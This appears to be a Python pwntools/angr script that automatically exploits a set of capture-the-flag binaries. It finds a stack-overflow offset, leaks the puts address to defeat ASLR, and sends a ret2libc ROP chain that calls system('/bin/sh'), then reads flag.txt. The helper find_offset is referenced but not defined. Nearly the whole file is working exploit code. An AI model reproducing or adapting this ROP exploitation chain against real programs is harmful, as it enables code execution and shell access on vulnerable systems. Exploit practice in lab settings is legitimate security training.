import logging
from logging import getLogger, basicConfig
import os
import concurrent.futures
import time
basicConfig(filename="/dev/null", level="INFO") # otherwise pwntools and angr logging clash
import pwn
import angr


getLogger('angr').setLevel('CRITICAL')
getLogger('cle').setLevel('CRITICAL')

offset = None
payload1 = None
payload2 = None
libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)


def generate_poc(binary_name: str) -> bool:
    global offset
    elf = pwn.context.binary = pwn.ELF(binary_name, checksec=False)
    rop = pwn.ROP(elf)
    solved, offset = find_offset(elf.path)
    if not solved:
        pwn.log.critical(f"Could not find memory corruption on level {binary_name}")
        return False
    else:
        pwn.log.success(f"Found memory corruption at offset: {len(offset)}")

    rop.puts(elf.got.puts)
    rop.call("main")
    pwn.log.debug(rop.dump())

    payload1 = offset + rop.chain()

    p = pwn.process([elf.path], level="CRITICAL")
    p.clean()
    p.sendline(payload1)
    p.recvline()
    leak = pwn.packing.u64(p.recv(6).ljust(8, b"\x00"))
    pwn.log.info(f"Leaked puts: {hex(leak)}")
    libc.address = leak - libc.sym.puts
    pwn.log.info(f"Libc base: {hex(libc.address)}")

    rop2 = pwn.ROP(libc)
    rop2.raw(rop2.find_gadget(["ret"]).address)
    rop2.call(libc.sym.system, [next(libc.search(b"/bin/sh\x00"))])

    payload2 = offset + rop2.chain()
    pwn.log.debug(f"Sending payload: {rop2.dump()}")

    p.sendline(payload2)
    p.clean()
    p.sendline(b"cat flag.txt")
    if b"FOOBAR" not in p.clean():
        return False

    pwn.log.success(f"Successfully exploited {binary_name}")
    return True

def main():
    # create a list of file names for all the binaries
    files = sorted(os.listdir("./binaries/level_4"))

    for file in files:
        generate_poc(os.path.join("./binaries/level_4", file))
        break


if __name__ == "__main__":
    main()
